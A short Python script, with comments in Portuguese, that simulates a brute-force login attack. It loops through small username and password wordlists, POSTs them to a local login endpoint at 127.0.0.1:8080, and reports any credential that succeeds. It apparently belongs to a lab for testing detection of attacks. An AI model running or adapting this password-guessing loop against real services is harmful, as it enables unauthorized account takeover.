import urllib.request
import json
import time

TARGET_URL = "http://127.0.0.1:8080/login"

# Dicionários de teste (Wordlists de simulação)
USERNAMES = ["admin", "root", "operador", "gestor", "supervisor"]
PASSWORDS = [
    "123456", "password", "admin123", "root2026",
    "qwerty", "mudar123", "soc123", "S0c_Secur3_2026!"
]

def run_bruteforce():
    print(f"[*] Iniciando simulacao de Forca Bruta contra {TARGET_URL}...")
    
    total_attempts = 0
    found = False

    for user in USERNAMES:
        if found:
            break
            
        for pwd in PASSWORDS:
            total_attempts += 1
            payload = json.dumps({"username": user, "password": pwd}).encode("utf-8")
            req = urllib.request.Request(
                TARGET_URL,
                data=payload,
                headers={"Content-Type": "application/json"}
            )

            try:
                with urllib.request.urlopen(req) as response:
                    if response.status == 200:
                        print(f"\n[+] CREDENCIAL ENCONTRADA na tentativa {total_attempts}!")
                        print(f"    Usuario : {user}")
                        print(f"    Senha   : {pwd}")
                        found = True
                        break
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    print(f"[-] Tentativa {total_attempts:02d}: {user}:{pwd} -> 401 Unauthorized")
                else:
                    print(f"[!] Erro inesperado: {e}")
            except urllib.error.URLError:
                print("[!] Nao foi possivel conectar ao servidor alvo. Verifique se target_service.py esta rodando.")
                return

            # Intervalo entre tentativas (reduzir para testar rajada rápida)
            time.sleep(0.15)

    print(f"\n[*] Simulacao concluida. Total de requisicoes enviadas: {total_attempts}")

if __name__ == "__main__":
    run_bruteforce()